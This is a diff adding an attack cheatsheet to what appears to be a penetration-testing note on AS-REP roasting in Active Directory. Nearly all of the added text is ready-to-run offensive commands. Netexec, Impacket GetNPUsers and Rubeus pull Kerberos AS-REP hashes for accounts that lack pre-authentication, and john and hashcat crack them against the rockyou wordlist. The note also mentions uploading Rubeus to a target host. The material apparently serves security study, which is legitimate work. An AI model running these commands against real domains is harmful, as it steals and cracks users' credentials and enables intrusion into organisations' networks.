@@ -20,3 +20,24 @@ By default when a domain user tries to authenticate to the kerberos AS (Authenti
 
 
 ### attack Cheatsheet
+- Netexec: we simply give it the dc ip and the sam usernames and an output file to store the stolen hashes  
+```shell
+nxc ldap <dc-ip> -u users.txt -p '' --asreproast outfile.txt
+```
+- Impacket-GetNPUsers
+```shell
+impacket-GetNPUsers simply.cyber/ -no-pass -usersfile users.txt -dc-ip 10.10.10.128 -outputfile hashes.txt
+```
+- Rubeus: we need to upload Rubeus.exe to the target first using smbserver/python3 http/ scp/ evil-winrm upload/ and so on..
+```shell
+.\rubeus.exe asreproast /nowrap /outfile:hash.txt /format:hashcat #/format:john
+```
+
+## Cracking AS_REP krbtgt tickets
+```shell
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+- Hashcat
+```shell
+hashcat -m 18200 -a 0 -o cracked_hashes.txt hashes.txt /usr/share/wordlists/rockyou.txt 
+```
